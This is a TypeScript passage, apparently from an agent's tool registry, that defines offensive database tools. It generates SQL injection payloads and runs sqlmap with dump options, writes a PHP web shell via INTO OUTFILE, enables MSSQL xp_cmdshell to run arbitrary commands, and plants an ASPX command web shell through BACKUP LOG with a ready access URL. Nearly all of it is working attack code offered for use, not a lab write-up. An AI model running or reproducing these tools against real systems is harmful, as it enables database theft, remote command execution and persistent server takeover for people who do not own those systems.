        findings.push(`\n=== ${payload_mode.toUpperCase()} 模式 ===`);
        if (payload_mode === "dbs") {
          findings.push(`  DB 提取模式 (示例 payload):`);
          if (detected.includes("error")) {
            findings.push(`    报错: 1' AND (SELECT CONCAT('||',SCHEMA_NAME,'||') FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1 OFFSET 0)--`);
          }
          if (detected.includes("boolean") || detected.includes("time")) {
            findings.push(`    盲注: 1' AND SUBSTRING((SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1),1,1)='a'--`);
          }
        } else if (payload_mode === "tables") {
          findings.push(`  表枚举示例 (db=${db_name || "当前库"}):`);
          findings.push(`    1' AND (SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='${db_name || "DB"}' LIMIT 1 OFFSET 0)--`);
        } else if (payload_mode === "columns") {
          findings.push(`  列枚举示例 (table=${table_name || "未指定"}):`);
          findings.push(`    1' AND (SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='${table_name || "TBL"}' LIMIT 1 OFFSET 0)--`);
        } else if (payload_mode === "dump") {
          findings.push(`  数据提取示例 (table=${table_name}, col=${column_name}):`);
          findings.push(`    UNION: 1' UNION SELECT 1,CONCAT(id,0x3a,${column_name || "col"}),3 FROM ${table_name || "tbl"}--`);
        } else if (payload_mode === "shell") {
          findings.push(`  Shell 写入 (MySQL + FILE权限 + 已知路径):`);
          findings.push(`    SELECT '<?php system($_GET[cmd]);?>' INTO OUTFILE '/var/www/html/shell.php'--`);
          findings.push(`    MSSQL: 启用 xp_cmdshell → EXEC master..xp_cmdshell 'whoami'`);
        }
      }

      if (commandExists("sqlmap") && detected.length > 0) {
        findings.push(`\n=== [可选] 使用 sqlmap (15s 超时) ===`);
        const techMap: Record<string, string> = { error: "E", boolean: "B", time: "T", union: "U" };
        const sqlmapTech = detected.map((d) => techMap[d]).join("") || "BEUSTQ";
        const flags: string[] = [
          "-u", `"${url}"`,
          "-p", `"${parameter}"`,
          `--technique=${sqlmapTech}`,
          `--level=2`, `--risk=2`,
          `--batch`, `--answers="follow=N"`,
          `--timeout=10`,
        ];
        if (isPost) { flags.push("--data", `"${data}"`); }
        if (cookie) { flags.push("--cookie", `"${cookie}"`); }
        if (payload_mode === "dbs") flags.push("--dbs");
        if (payload_mode === "tables") { flags.push("--tables"); if (db_name) flags.push("-D", `"${db_name}"`); }
        if (payload_mode === "columns") { flags.push("--columns"); if (db_name) flags.push("-D", `"${db_name}"`); if (table_name) flags.push("-T", `"${table_name}"`); }
        if (payload_mode === "dump") { flags.push("--dump"); if (db_name) flags.push("-D", `"${db_name}"`); if (table_name) flags.push("-T", `"${table_name}"`); if (column_name) flags.push("-C", `"${column_name}"`); }

        const sqlmapCmd = `sqlmap ${flags.join(" ")} 2>&1`;
        findings.push(`执行: ${sqlmapCmd.slice(0, 300)}`);
        const sm = runCmd(sqlmapCmd, 15000);
        findings.push(`\n输出 (前4000字符):\n${(sm.output + (sm.error || "")).slice(0, 4000)}`);
      }

      return `${findings.join("\n")}\n\n建议:\n${suggestions.join("\n") || "  未检测到 SQLi，或需要更深入测试"}`;
    },
  });

  registry.register({
    name: "sqlite_exploit",
    description: "SQLite 数据库分析：提取 schema/数据/版本/自定义 SQL 查询",
    parameters: z.object({
      sqlite_path: z.string().describe("SQLite 数据库文件路径"),
      mode: z.enum(["schema", "extract", "sqlite_version", "all"]).default("all").describe("运行模式"),
      query: z.string().optional().describe("自定义 SQL 查询（与 extract 共用模式）"),
      table_name: z.string().optional().describe("指定表名（extract 模式）"),
    }),
    category: "database",
    concurrent: true,
    execute: async (args: any) => {
      const { sqlite_path, mode, query, table_name } = args;

      if (!fs.existsSync(sqlite_path)) {
        return `[错误] SQLite 文件不存在: ${sqlite_path}`;
      }

      const useCli = commandExists("sqlite3");
      const sections: string[] = [];
      sections.push(`[SQLite分析] 文件=${sqlite_path} 使用=${useCli ? "sqlite3 CLI" : "python3 sqlite3"}`);

      const runSQLite = (sql: string) => {
        if (useCli) {
          return runCmd(`sqlite3 -header -column '${sqlite_path.replace(/'/g, "'\\''")}' '${sql.replace(/'/g, "'\\''")}' 2>&1`, 8000);
        }
        const py = `
import sqlite3, sys
try:
  c = sqlite3.connect('${sqlite_path.replace(/'/g, "''")}')
  cur = c.cursor()
  cur.execute('''${sql.replace(/'''/g, "'''\\'''").replace(/'/g, "''")}''')
  rows = cur.fetchall()
  cols = [d[0] for d in cur.description] if cur.description else []
  if cols: print(' | '.join(cols))
  for r in rows: print(' | '.join(str(x) for x in r))
except Exception as e:
  print('ERROR:', e)
`.trim();
        return runCmd(`python3 -c "${py.replace(/"/g, '\\"')}" 2>&1`, 10000);
      };

      if (mode === "all" || mode === "sqlite_version") {
        const v = runSQLite("SELECT sqlite_version();");
        sections.push(`\nSQLite 版本: ${v.output || v.error || "未知"}`);
      }

      if (mode === "all" || mode === "schema") {
        const s = useCli
          ? runCmd(`sqlite3 '${sqlite_path}' '.schema' 2>&1`, 8000)
          : runSQLite("SELECT sql FROM sqlite_master WHERE type IN ('table','index','view','trigger');");
        sections.push(`\nSchema:\n${s.output || "(空)"}\n`);
        const t = useCli
          ? runCmd(`sqlite3 '${sqlite_path}' '.tables' 2>&1`, 5000)
          : runSQLite("SELECT name FROM sqlite_master WHERE type='table';");
        sections.push(`表列表: ${t.output || "(无)"}`);
      }

      if (mode === "all" || mode === "extract") {
        if (query) {
          sections.push(`\n自定义查询: ${query}`);
          const q = runSQLite(query);
          sections.push(`结果 (前200行):\n${q.output.slice(0, 8000)}${q.error ? `\n错误: ${q.error}` : ""}`);
        } else if (table_name) {
          const count = runSQLite(`SELECT COUNT(*) FROM '${table_name.replace(/'/g, "''")}';`);
          sections.push(`\n表 ${table_name} 行数: ${count.output || "N/A"}`);
          const q = runSQLite(`SELECT * FROM '${table_name.replace(/'/g, "''")}' LIMIT 50;`);
          sections.push(`\nTOP50 行:\n${q.output.slice(0, 8000)}${q.error ? `\n错误: ${q.error}` : ""}`);
        } else {
          const tnames = (useCli
            ? runCmd(`sqlite3 '${sqlite_path}' '.tables' 2>&1`, 5000)
            : runSQLite("SELECT name FROM sqlite_master WHERE type='table';")
          ).output.trim();
          const names = tnames ? tnames.split(/\s+/).slice(0, 5) : [];
          sections.push(`\n自动预览前 ${names.length} 个表 (每表 5 行):`);
          for (const n of names) {
            const q = runSQLite(`SELECT * FROM '${n.replace(/'/g, "''")}' LIMIT 5;`);
            sections.push(`\n[${n}]\n${q.output.slice(0, 1500)}`);
          }
        }
      }

      return sections.join("\n");
    },
  });

  registry.register({
    name: "mssql_exploit",
    description: "MSSQL 高权利用：xp_cmdshell 命令执行/backup webshell/信息枚举（需 SA / ALTER SERVER 权限）",
    parameters: z.object({
      host: z.string().describe("目标主机"),
      port: z.number().int().default(1433).describe("端口，默认 1433"),
      username: z.string().default("sa").describe("用户名，默认 sa"),
      password: z.string().describe("密码"),
      mode: z.enum(["enable_xp_cmdshell", "exec_cmd", "backup_webshell", "info"]).default("info").describe("模式"),
      command: z.string().optional().describe("要执行的系统命令（exec_cmd 模式）"),
      webshell_path: z.string().optional().describe("WebShell 绝对路径，如 C:\\inetpub\\wwwroot\\shell.aspx"),
    }),
    category: "database",
    requirePermission: true,
    execute: async (args: any) => {
      const { host, port = 1433, username = "sa", password, mode, command, webshell_path } = args;

      if (!commandExists("sqlcmd")) {
        return "[错误] sqlcmd (mssql-tools) 未安装:\n  macOS: brew install mssql-tools\n  Debian: curl https://packages.microsoft.com/keys/microsoft.asc | apt-key add - && apt-get update && apt-get install mssql-tools unixodbc-dev\n  CentOS: yum install mssql-tools unixODBC-devel";
      }
      if (!portOpen(host, port, 2000)) {
        return `[错误] ${host}:${port} 端口未开放`;
      }

      const runSQL = (sql: string) => {
        const cmd = `sqlcmd -S '${host},${port}' -U '${username.replace(/'/g, "'\\''")}' -P '${password.replace(/'/g, "'\\''")}' -Q '${sql.replace(/'/g, "'\\''")}' -W -h -1 -s '|' 2>&1`;
        return runCmd(cmd, 12000);
      };

      const results: string[] = [];
      results.push(`[MSSQL 利用] ${host}:${port} 用户=${username} 模式=${mode}`);

      const test = runSQL("SELECT @@VERSION, SUSER_NAME(), IS_SRVROLEMEMBER('sysadmin');");
      if (!test.success && test.error && /login|Login failed|密码|无法连接/i.test(test.error!)) {
        results.push(`\n连接失败: ${test.error}`);
        return results.join("\n");
      }
      const isSysadmin = /1/.test(test.output.split("|").pop() || "");
      results.push(`\n版本/身份: ${test.output.split("\n").slice(0, 2).join("\n")}`);
      results.push(`sysadmin 角色: ${isSysadmin ? "⚠️ 是 (最高权限)" : "否 (有限权限)"}`);

      if (mode === "info") {
        const q1 = runSQL("SELECT name FROM sys.databases;");
        results.push(`\n数据库列表:\n${q1.output}`);
        const q2 = runSQL("SELECT name,type_desc,is_trustworthy_on FROM sys.databases;");
        results.push(`\n数据库属性:\n${q2.output}`);
        const q3 = runSQL("SELECT name,create_date,is_disabled FROM sys.sql_logins;");
        results.push(`\n登录账户:\n${q3.output}`);
        const q4 = runSQL("EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure;");
        results.push(`\n服务器配置 (show advanced):\n${q4.output.slice(0, 4000)}`);
        const q5 = runSQL("SELECT @@SERVERNAME,@@SERVICENAME,DB_NAME(),USER_NAME();");
        results.push(`\n环境信息:\n${q5.output}`);
        return results.join("\n");
      }

      if (mode === "enable_xp_cmdshell") {
        const enableSql = `
EXEC sp_configure 'show advanced options',1;RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
EXEC sp_configure 'xp_cmdshell';
`.trim();
        const r = runSQL(enableSql);
        results.push(`\n启用 xp_cmdshell:\n${r.output}\n${r.error ? `错误: ${r.error}` : ""}`);
        const test2 = runSQL("EXEC xp_cmdshell 'whoami';");
        results.push(`\n测试执行 whoami:\n${test2.output}\n${test2.error ? `错误: ${test2.error}` : ""}`);
        return results.join("\n");
      }

      if (mode === "exec_cmd") {
        const cmd = command || "whoami";
        const shellSql = `
IF EXISTS (SELECT * FROM sys.configurations WHERE name='xp_cmdshell' AND value=0)
BEGIN
  EXEC sp_configure 'show advanced options',1;RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
END
EXEC xp_cmdshell '${cmd.replace(/'/g, "''")}';
`.trim();
        const r = runSQL(shellSql);
        results.push(`\n执行: ${cmd}\n输出:\n${r.output}\n${r.error ? `错误: ${r.error}` : ""}`);
        results.push(`\n常用命令: ipconfig /all, dir C:\\, net user, net localgroup administrators, tasklist`);
        return results.join("\n");
      }

      if (mode === "backup_webshell") {
        const path = webshell_path || "C:\\inetpub\\wwwroot\\shell.aspx";
        const aspxShell = `<%@ Page Language="C#" Debug="true" Trace="false" %><%@Import Namespace="System.Diagnostics"%><%@Import Namespace="System.IO"%><script runat="server">void Page_Load(object s,EventArgs e){string c=Request["cmd"]??"whoami";Process p=new Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+c;p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write("<pre>"+Server.HtmlEncode(p.StandardOutput.ReadToEnd())+"</pre>");}</script>`;
        const backupSql = `
DECLARE @p NVARCHAR(MAX) = '${aspxShell.replace(/'/g, "''")}';
BACKUP DATABASE [model] TO DISK = N'${path.replace(/'/g, "''")}.bak' WITH INIT, FORMAT, NAME='x';
BACKUP LOG [model] TO DISK = N'${path.replace(/'/g, "''")}' WITH INIT, FORMAT, NAME='x', DIFFERENTIAL;
`.trim();
        const r1 = runSQL(`EXEC xp_cmdshell 'echo ASPX TEST > "${path.replace(/'/g, "''")}"' 2>&1`);
        results.push(`\n尝试直接写入 (via xp_cmdshell):\n${r1.output}\n${r1.error ? `错误: ${r1.error}` : ""}`);

        const r2 = runSQL(backupSql);
        results.push(`\nBACKUP LOG (差异备份写入 webshell) ${path}:\n${r2.output}\n${r2.error ? `错误: ${r2.error}` : ""}`);

        results.push(`\n说明:`);
        results.push(`  - 若 xp_cmdshell 可执行，优先用它直接写 echo/type 方式`);
        results.push(`  - BACKUP LOG/DIFFERENTIAL 适用于 SA 权限且可确认站点绝对路径`);
        results.push(`  - 访问: http://${host}/shell.aspx?cmd=whoami`);
        return results.join("\n");
      }

      return results.join("\n");
    },
  });

  return registry;
}
